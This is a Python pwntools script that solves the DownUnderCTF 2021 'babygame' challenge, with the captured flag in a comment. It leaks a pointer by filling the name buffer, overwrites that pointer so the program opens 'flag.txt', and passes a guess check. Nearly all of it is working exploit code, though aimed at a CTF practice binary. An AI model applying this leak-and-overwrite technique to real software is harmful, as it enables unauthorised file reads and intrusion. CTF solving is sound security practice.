from pwn import *
import sys

# DUCTF{whats_in_a_name?_5aacfc58}

elf = ELF('babygame')
context.update(binary=elf)

host = 'pwn-2021.duc.tf'
port = 31907

p = remote(host, port)
# p = elf.process()

size = 32
name = b'A' * size
p.recvuntil(b'name?\n')
p.send(name)

p.recvuntil(b'> ')
p.sendline(b'2')
leak = p.recvuntil(b'\n1. Set')[size:-7]

assert len(leak) == 6, 'Try again'
randbuf = u64(leak.ljust(8, b'\x00')) + 8348
log.info(f'RANDBUF: {hex(randbuf)}')
print(p64(randbuf - size))

p.recvuntil(b'> ')
p.sendline(b'1')
payload = b'flag.txt\x00'
payload += b'A' * (size - len(payload))
payload += p64(randbuf - size)[:6]
p.send(payload)

ptr = u32(b'DUCT')
log.info(f'ptr: {ptr}')

p.recvuntil(b'> ')
p.sendline(b'1337')
p.recvuntil(b'guess: ')
p.sendline(str(ptr).encode())

p.interactive()

p.close()
